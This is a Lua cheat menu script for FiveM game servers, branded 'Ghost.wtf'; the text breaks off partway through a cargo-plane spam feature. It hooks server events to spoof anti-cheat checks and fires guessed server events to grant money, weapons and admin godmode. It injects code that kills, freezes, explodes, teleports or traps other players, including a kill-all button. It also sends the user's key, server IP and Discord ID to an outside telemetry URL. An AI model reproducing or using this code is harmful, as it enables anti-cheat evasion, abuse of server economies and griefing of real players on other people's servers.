--// Major Functions \\--
function printInfo(msg)
    print("^3[INFO]^7 " .. msg)  -- Yellow tag
end

function printsuccess(msg)
    print("^2[SUCCESS]^7 " .. msg)  -- Green tag
end

function printerror(msg)
    if sendSnackbarMessage then
        sendSnackbarMessage('error', msg, true)
    else
        print("^1[ERROR]^7 " .. msg) -- ^1 for red color in FiveM console
    end
end

function printPurple(msg)
    local selectedColor = "^6" -- ^6 is gold/yellow in most consoles; FiveM doesn't have true purple
    print(selectedColor .. "[INFO]^7 " .. msg)
end

MachoLockLogger(1)

--// Fiveguard & Electron AC Bypass \\--
local function obfuscateString(str)
    local bytes = {}
    for i = 1, #str do
        bytes[i] = string.byte(str, i) + (i % 7)
    end
    return string.char(table.unpack(bytes))
end

local function deobfuscateString(str)
    local bytes = {}
    for i = 1, #str do
        bytes[i] = string.byte(str, i) - (i % 7)
    end
    return string.char(table.unpack(bytes))
end

local originalTriggerServerEvent = TriggerServerEvent
local function hookedTriggerServerEvent(eventName, ...)
    Citizen.Wait(math.random(50, 200))
    local maskedEvent = obfuscateString(eventName)
    local args = {...}
    if string.find(eventName, "check") or string.find(eventName, "verify") then
        args = {math.random(1, 1000), "spoofed_data", math.random(1, 1000)}
    end
    originalTriggerServerEvent(deobfuscateString(maskedEvent), table.unpack(args))
end

TriggerServerEvent = hookedTriggerServerEvent

local function bypassACChecks()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(1000)
            local playerPed = PlayerPedId()
            SetEntityVelocity(playerPed, 0.0, 0.0, 0.0)
            local ghost = math.random(1, 999999)
            _G["ghostCheck" .. ghost] = ghost
        end
    end)
end

local function logAndExploitEvents()
    local discoveredEvents = {}
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(500)
            local possibleEvents = {
                "esx:getday",
                "esx:getdayMoney",
                "vrp:giveMoney",
                "qb-core:giveItem",
                "admin:godmode",
                "server:spawnVehicle",
                "economy:depositMoney",
                "inventory:addItem"
            }
            for _, event in ipairs(possibleEvents) do
                if not discoveredEvents[event] then
                    discoveredEvents[event] = true
                    Citizen.CreateThread(function()
                        Citizen.Wait(math.random(100, 500))
                        TriggerServerEvent(event, math.random(1000, 10000), "test_payload")
                    end)
                end
            end
        end
    end)
    local function massExploit()
        for event, _ in pairs(discoveredEvents) do
            Citizen.CreateThread(function()
                Citizen.Wait(math.random(200, 800))
                if string.find(event, "money") or string.find(event, "cash") then
                    TriggerServerEvent(event, 9999999)
                elseif string.find(event, "item") then
                    TriggerServerEvent(event, "weapon_pistol", 1)
                elseif string.find(event, "vehicle") then
                    TriggerServerEvent(event, "adder")
                elseif string.find(event, "godmode") or string.find(event, "admin") then
                    TriggerServerEvent(event, true)
                end
            end)
        end
    end
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(300000)
            massExploit()
        end
    end)
end

bypassACChecks()
logAndExploitEvents()

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(10000)
        local randomAction = math.random(1, 3)
        if randomAction == 1 then
            TriggerServerEvent("ghost:event", math.random(1, 100))
        end
    end
end)

--// Resource Status Checker \\--
function isResourceRunning(resourceName)
    if resourceName == "ReaperV4" then
        return false
    end

    local success, state = pcall(GetResourceState, resourceName)
    
    if not success or not state then
        return false
    end
    
    return state == "started" or state == "starting"
end

--// Key Auth \\--
isAuthenticated = false

local debugMode = false

local authURL = "https://sosaservices.xyz/ghost/isosnfeuinc.json"

local function urlEncode(str)
    return tostring(str):gsub("([^%w ])", function(c)
        return string.format("%%%02X", string.byte(c))
    end):gsub(" ", "+")
end

local function isValidFunction(func)
    return type(func) == "function"
end

local function getDiscordIdFromKey()
    local machoKey = MachoAuthenticationKey()
    local request = MachoWebRequest
    if not isValidFunction(request) then return "unknown" end

    local response = request(authURL)
    if not response or response == "" then return "unknown" end

    local parsed = json.decode(response:match("^%s*(.-)%s*$"))
    if not parsed or not parsed[machoKey] then return "unknown" end

    return tostring(parsed[machoKey].discord_id or "unknown")
end

local function sendTelemetryLog()
    local machoKey = MachoAuthenticationKey()
    local ip = GetCurrentServerEndpoint() or "127.0.0.1"
    local version = "Ghost.wtf-v1.0"
    local server = ip
    local user_id = getDiscordIdFromKey()

    local telemetryUrl = string.format(
        "https://sosaservices.xyz/ghost/telemetry.php",
        urlEncode(machoKey),
        urlEncode(ip),
        urlEncode(version),
        urlEncode(server),
        urlEncode(user_id)
    )

    if debugMode then
        print("[Ghost.wtf] Telemetry URL:", telemetryUrl)
    end

    local result = MachoWebRequest(telemetryUrl)
    if debugMode and result then
        print("[Ghost.wtf] Telemetry response:", result)
    end
end

function authenticateKey()
    isAuthenticated = false

    local getKey = MachoAuthenticationKey
    local request = MachoWebRequest

    if not isValidFunction(request) then
        MachoMenuNotification("Ghost.wtf", "Error: MachoWebRequest function missing.")
        return false
    end

    if not isValidFunction(getKey) then
        MachoMenuNotification("Ghost.wtf", "Error: MachoAuthenticationKey function missing.")
        return false
    end

    local response = request(authURL)
    if not response or response == "" then
        MachoMenuNotification("Ghost.wtf", "Invalid or expired key.")
        return false
    end

    local parsed = json.decode(response:match("^%s*(.-)%s*$"))
    local keyData = parsed[getKey()]
    if not keyData or type(keyData) ~= "table" then
        MachoMenuNotification("Ghost.wtf", "Invalid or expired key.")
        return false
    end

    local function parseDate(dateStr)
        local y, m, d = dateStr:match("^(%d+)%-(%d+)%-(%d+)$")
        return os.time({ year = tonumber(y), month = tonumber(m), day = tonumber(d), hour = 23, min = 59, sec = 59 })
    end

    local now = os.time()
    local expireTime = parseDate(keyData.expires_at or "")
    if not expireTime or expireTime < now then
        MachoMenuNotification("Ghost.wtf", "Key expired.")
        return false
    end


    isAuthenticated = true
    local expiresAt = keyData.expires_at or "unknown"
    MachoMenuNotification("Ghost.wtf", "Key authenticated. Expires: " .. expiresAt)

    sendTelemetryLog()

    return true
end

if not authenticateKey() then
    if window then
        MachoMenuDestroy(window)
    end
    return
end

MachoMenuNotification("Ghost.wtf", "Press CapsLock to open the menu")

--// Initialize Menu \\--
printInfo("Loading.....")

Citizen.Wait(1000)

printInfo("Checking Auth....")

Citizen.Wait(1000)

printsuccess("Loaded Succesfully!")

--// Get Nearest Player \\--
function getNearestPlayer()
    local players = GetActivePlayers()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local closestPed = nil
    local closestDistance = -1

    for _, playerId in ipairs(players) do
        if playerId ~= PlayerId() then
            local targetPed = GetPlayerPed(playerId)
            local targetPos = GetEntityCoords(targetPed)
            local distance = #(pos - targetPos)

            if closestDistance == -1 or distance < closestDistance then
                closestPed = playerId
                closestDistance = distance
            end
        end
    end

    return closestPed
end

--// Main Menu \\--

local MenuSize = vec2(750, 500)
local screenW, screenH = GetActiveScreenResolution()
local MenuStartCoords = vec2(screenW / 2 - MenuSize.x / 2, screenH / 2 - MenuSize.y / 2)

local TabsBarWidth = 150.0
local SectionsPadding = 15
local MachoPaneGap = 15

local SectionChildWidth = MenuSize.x - TabsBarWidth
local SectionColumns = 2
local SectionRows = 2

local TwoByTwoSectionWidth = (SectionChildWidth - (SectionsPadding * (SectionColumns + 1))) / SectionColumns
local TwoByTwoSectionHeight = (MenuSize.y - (SectionsPadding * (SectionRows + 1))) / SectionRows


local function GetSectionCoords(col, row, colspan, rowspan)
    colspan = colspan or 1
    rowspan = rowspan or 1

    local startX = TabsBarWidth + (SectionsPadding * col) + (TwoByTwoSectionWidth * (col - 1))
    local startY = (SectionsPadding * row) + (TwoByTwoSectionHeight * (row - 1)) + MachoPaneGap

    local endX = startX + (TwoByTwoSectionWidth * colspan) + (SectionsPadding * (colspan - 1))
    local endY = startY + (TwoByTwoSectionHeight * rowspan) + (SectionsPadding * (rowspan - 1))

    return startX, startY, endX, endY
end


MenuWindow = MachoMenuTabbedWindow("Ghost.wtf", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
MachoMenuSetAccent(MenuWindow, 255, 255, 255)
MachoMenuSetKeybind(MenuWindow, 0x14)
MachoMenuSmallText(MenuWindow, "Discord.gg/ghostwtf")


local PlayerTab   = MachoMenuAddTab(MenuWindow, "Player")
local ServerTab   = MachoMenuAddTab(MenuWindow, "Server")
local TeleportTab   = MachoMenuAddTab(MenuWindow, "Teleport")
local VehicleTab  = MachoMenuAddTab(MenuWindow, "Vehicle")
local WeaponTab   = MachoMenuAddTab(MenuWindow, "Weapon")
local EmotesTab = MachoMenuAddTab(MenuWindow, "Emotes")
local ExecutionsTab = MachoMenuAddTab(MenuWindow, "Executions")
local EventsTab = MachoMenuAddTab(MenuWindow, "Events")
local SettingsTab = MachoMenuAddTab(MenuWindow, "Settings")


local PlayerSection1 = MachoMenuGroup(PlayerTab, "Main", GetSectionCoords(1, 1, 1, 2))
local PlayerSection2 = MachoMenuGroup(PlayerTab, "Misc", GetSectionCoords(2, 1))
local PlayerSection3 = MachoMenuGroup(PlayerTab, "Health & Food", GetSectionCoords(2, 2))

local ServerSection1 = MachoMenuGroup(ServerTab, "Target Nearest Player", GetSectionCoords(1, 1))
local ServerSection2 = MachoMenuGroup(ServerTab, "Target Server", GetSectionCoords(1, 2))
local ServerSection3 = MachoMenuGroup(ServerTab, "Exploits", GetSectionCoords(2, 1, 1, 2))

local TeleportTab = MachoMenuGroup(
    TeleportTab,
    "Teleport Options",
    TabsBarWidth + SectionsPadding,
    SectionsPadding + MachoPaneGap,
    MenuSize.x - SectionsPadding,
    MenuSize.y - SectionsPadding
)

local VehicleSection1 = MachoMenuGroup(VehicleTab, "Vehicle Spawner", GetSectionCoords(1, 1))
local VehicleSection2 = MachoMenuGroup(VehicleTab, "Misc", GetSectionCoords(1, 2))
local VehicleSection3 = MachoMenuGroup(VehicleTab, "Mods", GetSectionCoords(2, 1, 1, 2))

local WeaponSection1 = MachoMenuGroup(WeaponTab, "Weapon Spawner", GetSectionCoords(1, 1, 1, 2))
local WeaponSection2 = MachoMenuGroup(WeaponTab, "Weapon Mods", GetSectionCoords(2, 1, 1, 2))

local EmotesSection1 = MachoMenuGroup(EmotesTab, "Animations", GetSectionCoords(1, 1, 1, 2))
local EmotesSection2 = MachoMenuGroup(EmotesTab, "Risky Animations", GetSectionCoords(2, 1, 1, 2))

local ExecutionsSection1 = MachoMenuGroup(ExecutionsTab, "Triggers", GetSectionCoords(1, 1))
local ExecutionsSection2 = MachoMenuGroup(ExecutionsTab, "Payloads", GetSectionCoords(1, 2))
local ExecutionsSection3 = MachoMenuGroup(ExecutionsTab, "Coming Soon", GetSectionCoords(2, 1, 1, 2))

local EventsSection1 = MachoMenuGroup(EventsTab, "Dynamic Triggers", GetSectionCoords(1, 1, 1, 1))
local EventsSection2 = MachoMenuGroup(EventsTab, "Custom Triggers", GetSectionCoords(2, 1, 1, 1))
local EventsSection3 = MachoMenuGroup(EventsTab, "Spawner", GetSectionCoords(1, 2, 1, 1))
local EventsSection4 = MachoMenuGroup(EventsTab, "Exploits", GetSectionCoords(2, 2, 1, 1))

local SettingsSection1 = MachoMenuGroup(SettingsTab, "Menu Customization", GetSectionCoords(1, 1))
local SettingsSection2 = MachoMenuGroup(SettingsTab, "World Customization", GetSectionCoords(1, 2))
local SettingsSection3 = MachoMenuGroup(SettingsTab, "Misc", GetSectionCoords(2, 1, 1, 2))

--//Player Section\\--

local HealAmount = 0
local ArmorAmount = 0

MachoMenuSlider(PlayerSection1, "HP Amount", 0, 0, 100, "", 0, function(value)
    HealAmount = value
end)

MachoMenuSlider(PlayerSection1, "Armor Amount", 0, 0, 100, "", 0, function(value)
    ArmorAmount = value
end)

MachoMenuButton(PlayerSection1, "Heal", function() 
    local code = [[

        function GhostHeal()
            CreateThread(function()
                local ped = PlayerPedId()
                if not DoesEntityExist(ped) then return end

                local currentHealth = GetEntityHealth(ped)
                local maxHealth = GetEntityMaxHealth(ped)

                if currentHealth <= 0 or currentHealth >= maxHealth then return end

                local HealAmount = 25 -- You can change this value as needed
                local newHealth = math.min(currentHealth + HealAmount, maxHealth)

                SetEntityHealth(ped, newHealth)
            end)
        end

        GhostHeal()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Heal triggers executed")
end)

MachoMenuButton(PlayerSection1, "Set Armor", function() 
    local code = [[

        function GhostSetArmor()
            CreateThread(function()
                local ped = PlayerPedId()
                if not DoesEntityExist(ped) then return end

                local ArmorAmount = 100
                if type(ArmorAmount) ~= "number" then return end

                SetPedArmour(ped, ArmorAmount)
            end)
        end

        GhostSetArmor()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Set Armor triggers executed")
end)


MachoMenuCheckbox(PlayerSection1, "God Mode",
    function()
        local code = [[
            GodLoopRunning = true

            function GodLoop()
                if _GodLoopThread then return end
                _GodLoopThread = true

                CreateThread(function()
                    while GodLoopRunning do
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            SetEntityInvincible(ped, true)
                            SetPlayerInvincible(PlayerId(), true)
                            SetPedCanRagdoll(ped, false)
                            ClearPedBloodDamage(ped)
                            SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                            SetPedArmour(ped, 100)
                            SetEntityHealth(ped, GetEntityMaxHealth(ped))
                        end
                        Wait(500)
                    end
                end)
            end

            GodLoop()
        ]]
        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "God Mode Enabled")
    end,
    function()
        local code = [[
            GodLoopRunning = false
            _GodLoopThread = false
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityInvincible(ped, false)
                SetPlayerInvincible(PlayerId(), false)
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            end
        ]]
        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "God Mode Disabled")
    end
)

MachoMenuCheckbox(PlayerSection1, "Invisible", 
    function()
        Invisible = true
        MachoInjectResource("any", [[
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) then
                if GetEntityAlpha(ped) ~= 0 then
                    SetEntityAlpha(ped, 0, false)
                    SetEntityVisible(ped, false, false)
                end
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "Invisibility enabled.")
    end,

    function()
        Invisible = false
        MachoInjectResource("any", [[
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) then
                ResetEntityAlpha(ped)
                SetEntityVisible(ped, true, false)
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "Invisibility disabled.")
    end
)

MachoMenuCheckbox(PlayerSection1, "Fast Run", 
    function()  
        FastRun = true
        Citizen.CreateThread(function()
            while FastRun do
                MachoInjectResource("any", [[
                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                    SetPedMoveRateOverride(PlayerPedId(), 3.0)
                ]])
                Citizen.Wait(30)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Fast Run enabled")
    end,
    function()  
        FastRun = false
        MachoInjectResource("any", [[
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        ]])
        MachoMenuNotification("Ghost.wtf", "Fast Run disabled")
    end
)

MachoMenuCheckbox(PlayerSection1, "Infinite Combat Roll", 
    function()  
        infiniteCombatRollToggle = true
        Citizen.CreateThread(function()
            while infiniteCombatRollToggle do
                MachoInjectResource("any", [[
                    local playerPed = PlayerPedId()
                    if DoesEntityExist(playerPed) then
                        SetPedCombatAbility(playerPed, 3)
                    end
                ]])
                Citizen.Wait(0)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Infinite Combat Roll enabled")
    end,
    function()  
        infiniteCombatRollToggle = false
        MachoInjectResource("any", [[
            local playerPed = PlayerPedId()
            if DoesEntityExist(playerPed) then
                SetPedCombatAbility(playerPed, 1)
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "Infinite Combat Roll disabled")
    end
)

MachoMenuCheckbox(PlayerSection1, "Infinite Stamina", 
    function()  
        infiniteStamina = true
        Citizen.CreateThread(function()
            while infiniteStamina do
                MachoInjectResource("any", [[
                    ResetPlayerStamina(PlayerId())
                ]])
                Citizen.Wait(30)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Infinite Stamina enabled")
    end,
    function()  
        infiniteStamina = false
        MachoMenuNotification("Ghost.wtf", "Infinite Stamina disabled")
    end
)

MachoMenuCheckbox(PlayerSection1, "Super Jump", 
    function()  
        SuperJumpToggle = true
        Citizen.CreateThread(function()
            while SuperJumpToggle do
                MachoInjectResource("any", [[
                    SetSuperJumpThisFrame(PlayerId())
                ]])
                Citizen.Wait(0)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Super Jump enabled")
    end,
    function()  
        SuperJumpToggle = false
        MachoMenuNotification("Ghost.wtf", "Super Jump disabled")
    end
)




MachoMenuCheckbox(PlayerSection1, "No Collision", 
    function()  
        NoColision = true
        MachoInjectResource("any", [[
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityCollision(ped, false, false)
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "No Collision enabled")
    end,
    function()  
        NoColision = false
        MachoInjectResource("any", [[
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityCollision(ped, true, false)
            end
        ]])
        MachoMenuNotification("Ghost.wtf", "No Collision disabled")
    end
)

MachoMenuCheckbox(PlayerSection1, "No Ragdoll", function() 
    NoRagdoll = true
    MachoInjectResource("any", [[
        SetPedCanRagdoll(PlayerPedId(), false)
    ]])
    MachoMenuNotification("Ghost.wtf", "No Ragdoll enabled")
end, function() 
    NoRagdoll = false
    MachoInjectResource("any", [[
        SetPedCanRagdoll(PlayerPedId(), true)
    ]])
    MachoMenuNotification("Ghost.wtf", "Ragdoll enabled")
end)

MachoMenuCheckbox(PlayerSection1, "Anti Fire/Explosion Damage", function() 
    AntiFireExplosionToggle = true
    MachoInjectResource("any", [[
        SetEntityProofs(PlayerPedId(), false, true, true, false, true, false, false, false)
    ]])
    MachoMenuNotification("Ghost.wtf", "Anti Fire/Explosion Damage enabled")
end, function() 
    AntiFireExplosionToggle = false
    MachoInjectResource("any", [[
        SetEntityProofs(PlayerPedId(), false, false, false, false, false, false, false, false)
    ]])
    MachoMenuNotification("Ghost.wtf", "Anti Fire/Explosion Damage disabled")
end)

MachoMenuCheckbox(PlayerSection1, "Anti HeadShot", function() 
    AntiHs = true
    MachoInjectResource("any", [[
        local ped = PlayerPedId()
        if DoesEntityExist(ped) then
            SetPedSuffersCriticalHits(ped, false)
        end
    ]])
    MachoMenuNotification("Ghost.wtf", "Anti HeadShot enabled")
end, function() 
    AntiHs = false
    MachoInjectResource("any", [[
        local ped = PlayerPedId()
        if DoesEntityExist(ped) then
            SetPedSuffersCriticalHits(ped, true)
        end
    ]])
    MachoMenuNotification("Ghost.wtf", "Anti HeadShot disabled")
end)

MachoMenuButton(PlayerSection1, "Randomize Outfit", function()
    local code = [[
        function GhostRandomizeOutfit()
            local ped = PlayerPedId()
            for component = 0, 11 do
                local drawable = math.random(1, 200)
                local texture = math.random(0, 10)
                SetPedComponentVariation(ped, component, drawable, texture, 0)
            end
        end
        GhostRandomizeOutfit()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Randomize Outfit Trigged Executed")
end)

MachoMenuButton(PlayerSection1, "Clear Player Tasks", function()
    MachoInjectResource("any", [[
        ClearPedTasksImmediately(PlayerPedId())
    ]])
end)

--// Player Section 2\\--

MachoMenuCheckbox(PlayerSection2, "NoClip", 
    function()
        local code = [[
            NoClipActive = true
            NoClipRunning = false

            function Define()
                local NoClipSpeed = 3.5
                local ped = PlayerPedId()

                CreateThread(function()
                    while NoClipActive do
                        if IsControlJustPressed(0, 303) then -- U key
                            NoClipRunning = not NoClipRunning

                            if NoClipRunning then
                                FreezeEntityPosition(ped, true)
                                SetEntityVisible(ped, false, false)
                                SetEntityInvincible(ped, true)
                                SetEntityCollision(ped, false, false)
                            else
                                FreezeEntityPosition(ped, false)
                                SetEntityVisible(ped, true)
                                SetEntityInvincible(ped, false)
                                SetEntityCollision(ped, true, true)
                            end
                        end

                        if NoClipRunning then
                            local pos = GetEntityCoords(ped)
                            local camRot = GetGameplayCamRot(2)
                            local heading = math.rad(camRot.z)
                            local pitch = math.rad(camRot.x)

                            local forward = vector3(
                                -math.sin(heading) * math.abs(math.cos(pitch)),
                                 math.cos(heading) * math.abs(math.cos(pitch)),
                                 math.sin(pitch)
                            )

                            if IsControlPressed(0, 32) then
                                pos = pos + forward * NoClipSpeed
                            elseif IsControlPressed(0, 33) then
                                pos = pos - forward * NoClipSpeed
                            end

                            if IsControlPressed(0, 44) then
                                pos = pos + vector3(0.0, 0.0, NoClipSpeed * 0.5)
                            elseif IsControlPressed(0, 36) then
                                pos = pos - vector3(0.0, 0.0, NoClipSpeed * 0.5)
                            end

                            SetEntityCoordsNoOffset(ped, pos.x, pos.y, pos.z, false, false, false)
                            SetEntityVelocity(ped, 0.0, 0.0, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            Define()
        ]]
        MachoInjectResourceRaw("monitor", code)
        MachoMenuNotification("Ghost.wtf", "NoClip enabled (U to toggle)")
    end,

    function()
        local code = [[
            NoClipActive = false
            local ped = PlayerPedId()
            FreezeEntityPosition(ped, false)
            SetEntityVisible(ped, true)
            SetEntityInvincible(ped, false)
            SetEntityCollision(ped, true, true)
        ]]
        MachoInjectResourceRaw("monitor", code)
        MachoMenuNotification("Ghost.wtf", "NoClip disabled")
    end
)

MachoMenuCheckbox(PlayerSection2, "Freecam (WIP/BETA)", function() 
    local code = [[

        function GhostFreecam()
            CreateThread(function()
            -- Logic/Code
            end)
        end

        GhostFreecam()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Freecam triggers executed")
end)

local isNoClipEnabled = false

MachoMenuCheckbox(PlayerSection2, "TX Admin Noclip (WIP ON REAPERAC)", function() 
    if not isNoClipEnabled then
        TriggerEvent('txcl:setPlayerMode', "noclip", true)
        isNoClipEnabled = true
        MachoMenuNotification("No-Clip Enabled", "You have enabled No-Clip mode.")
    end
end, function() 
    if isNoClipEnabled then
        TriggerEvent('txcl:setPlayerMode', "none", true)
        isNoClipEnabled = false
        MachoMenuNotification("No-Clip Disabled", "You have disabled No-Clip mode.")
    end
end)

local pedInputBox = MachoMenuInputbox(PlayerSection2, "Enter Ped Model:", "Enter ped model name here...")

MachoMenuButton(PlayerSection2, "Change Ped Model", function() 
    local pedModel = MachoMenuGetInputbox(pedInputBox)

    if pedModel == nil or pedModel == "" then
        MachoMenuNotification("Invalid Model", "Please enter a valid ped model name.")
        return
    end

    pedModel = pedModel:gsub('"', '\\"') -- Escape any quotes to avoid breaking Lua syntax

    local code = string.format([[
        local pedModel = "%s"
        local modelHash = GetHashKey(pedModel)
        RequestModel(modelHash)

        while not HasModelLoaded(modelHash) do
            Wait(0)
        end

        SetPlayerModel(PlayerId(), modelHash)
        SetModelAsNoLongerNeeded(modelHash)
    ]], pedModel)

    MachoInjectResource("any", code)

    -- Show notification from your external menu context
    MachoMenuNotification("Ped Model Changed", "Changed ped model to: " .. pedModel)
end)

--// Player Section 3 \\--

MachoMenuButton(PlayerSection3, "Full Food (ESX)", function()
    MachoInjectResource('any', [[
    local function g()
        TriggerEvent('esx_status:set', 'hunger', 1000000)
    end
    g()
]])
end)

MachoMenuButton(PlayerSection3, "Full Thirst (ESX)", function()
    MachoInjectResource('any', [[
    local function g()
        TriggerEvent('esx_status:set', 'thirst', 1000000)
    end
    g()
]])
end)

MachoMenuButton(PlayerSection3, "Remove Stress (ESX)", function()
    MachoInjectResource('any', [[
    local function g()
        TriggerEvent('esx_status:set', 'stress', 0)
    end
    g()
]])
end)

--// Server Section \\--

MachoMenuButton(ServerSection1, "Teleport Player to Me", function()
    local targetID = tonumber(MachoMenuGetInputBoxText(TargetIDInput))
    if not targetID then
        MachoMenuNotification("Ghost.wtf", "Invalid ID entered", 255, 0, 0)
        return
    end

    local myPed = PlayerPedId()
    local myCoords = GetEntityCoords(myPed)
    
    local code = string.format([[
        function TeleportToYou()
            CreateThread(function()
                local targetPed = GetPlayerPed(%d)
                if targetPed then
                    SetEntityCoords(targetPed, %f, %f, %f, false, false, false, true)
                end
            end)
        end

        TeleportToYou()
    ]], targetID, myCoords.x, myCoords.y, myCoords.z)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Teleporting ID %d to your location", 100, 255, 100)
end)

MachoMenuButton(ServerSection1, "Teleport Player to Random Place", function()
    local targetPlayer
    if TargetWhoAllOrTargetDropDown == 0 then
        targetPlayer = MachoMenuGetSelectedPlayer()
    elseif TargetWhoAllOrTargetDropDown == 1 then
        targetPlayer = getNearestPlayer()
    end

    if targetPlayer ~= nil then
        local x, y, z = math.random(-3000, 3000), math.random(-3000, 3000), 500.0
        local code = string.format([[
            function TeleportTarget()
                CreateThread(function()
                    local target = GetPlayerPed(%d)
                    if target then
                        SetEntityCoords(target, %f, %f, %f, false, false, false, true)
                    end
                end)
            end

            TeleportTarget()
        ]], targetPlayer, x, y, z)

        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "Player teleported to random coords.")
    else
        MachoMenuNotification("Ghost.wtf", "No player selected.", 255, 50, 50)
    end
end)

MachoMenuButton(ServerSection1, "Send to Ocean", function()
    local id = getNearestPlayer()
    if not id then return MachoMenuNotification("Ghost.wtf", "No target found") end

    local code = string.format([[
        local tgt = GetPlayerPed(%d)
        local function ForceDrown()
            SetEntityCoords(tgt, -3000.0, -3000.0, 0.0, false, false, false, true)
            FreezeEntityPosition(tgt, true)
        end

        CreateThread(function()
            for i = 1, 100 do
                ForceDrown()
                Citizen.Wait(100)
            end
        end)
    ]], id)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Attempting to ocean trap")
end)

MachoMenuButton(ServerSection1, "Freeze Player", function()
    local id = getNearestPlayer()
    if not id then return MachoMenuNotification("Ghost.wtf", "No target found") end

    local code = string.format([[
        function GhostFreeze()
            local ped = GetPlayerPed(%d)
            FreezeEntityPosition(ped, true)
        end
        GhostFreeze()
    ]], id)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Frozen.")
end)

MachoMenuButton(ServerSection1, "Unfreeze Player", function()
    local id = getNearestPlayer()
    if not id then return MachoMenuNotification("Ghost.wtf", "No target found") end

    local code = string.format([[
        function GhostUnfreeze()
            local ped = GetPlayerPed(%d)
            FreezeEntityPosition(ped, false)
        end
        GhostUnfreeze()
    ]], id)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Unfrozen.")
end)

MachoMenuButton(ServerSection1, "Ragdoll Player", function()
    local id = getNearestPlayer()
    if not id then return MachoMenuNotification("Ghost.wtf", "No target found") end

    local code = string.format([[
        function GhostRagdoll()
            local ped = GetPlayerPed(%d)
            SetPedToRagdoll(ped, 5000, 5000, 0, false, false, false)
        end
        GhostRagdoll()
    ]], id)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Ragdoll applied.")
end)

MachoMenuButton(ServerSection1, "Kill Player", function()
    local targetPed
    if TargetWhoAllOrTargetDropDown == 0 then
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if selectedPlayer then
            targetPed = GetPlayerPed(selectedPlayer)
        end
    elseif TargetWhoAllOrTargetDropDown == 1 then
        targetPed = getNearestPlayer()
    end

    if targetPed and DoesEntityExist(targetPed) then
        local coords = GetEntityCoords(targetPed)

        local code = string.format([[
            local targetPos = vector3(%.2f, %.2f, %.2f)
            for _, id in ipairs(GetActivePlayers()) do
                local ped = GetPlayerPed(id)
                if ped and #(GetEntityCoords(ped) - targetPos) < 2.0 then
                    local HeadBone = GetPedBoneIndex(ped, 31086)
                    local HeadShotPos = GetWorldPositionOfEntityBone(ped, HeadBone)
                    ShootSingleBulletBetweenCoords(
                        HeadShotPos.x, HeadShotPos.y, HeadShotPos.z,
                        HeadShotPos.x, HeadShotPos.y, HeadShotPos.z,
                        200,
                        true,
                        GetHashKey("weapon_pistol"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                    break
                end
            end
        ]], coords.x, coords.y, coords.z)

        MachoInjectResource("any", code)
    end
end)

MachoMenuButton(ServerSection1, "Kill All Players (Server)", function()
    local code = [[
        function GhostKillAllPlayers()
            CreateThread(function()
                local myId = PlayerId()
                for _, pid in ipairs(GetActivePlayers()) do
                    if pid ~= myId then
                        local ped = GetPlayerPed(pid)
                        if DoesEntityExist(ped) then
                            SetEntityHealth(ped, 0)
                        end
                        Wait(50)
                    end
                end
            end)
        end

        GhostKillAllPlayers()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Killed all players.")
end)

MachoMenuButton(ServerSection1, "Explode Player", function()
    local id = getNearestPlayer()
    if not id then return MachoMenuNotification("Ghost.wtf", "No target found") end

    local code = string.format([[
        function GhostExplode()
            local ped = GetPlayerPed(%d)
            local coords = GetEntityCoords(ped)
            AddExplosion(coords.x, coords.y, coords.z, 2, 10.0, true, false, 1.0)
        end
        GhostExplode()
    ]], id)

    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Executed.")
end)

--// Server Section 2 \\--

MachoMenuCheckbox(ServerSection2, "Cargo Plane Spammer", function() 
    local TugSpamActive = true  

    CreateThread(function()
        local model = 'cargoplane'
        RequestModel(model)

        while not HasModelLoaded(model) do
            Wait(0)
        end

        local count = 0
        while TugSpamActive and count < 900000000000 do  -- Higher spawn count, can adjust as needed
            local pos = GetEntityCoords(PlayerPedId())
            local offsetX = math.random(-15, 15)
            local offsetY = math.random(-15, 15)

            local code = string.format([[
                function GhostTugSpam()
                    local model = 'cargoplane'
                    RequestModel(model)
                    while not HasModelLoaded(model) do Wait(0) end

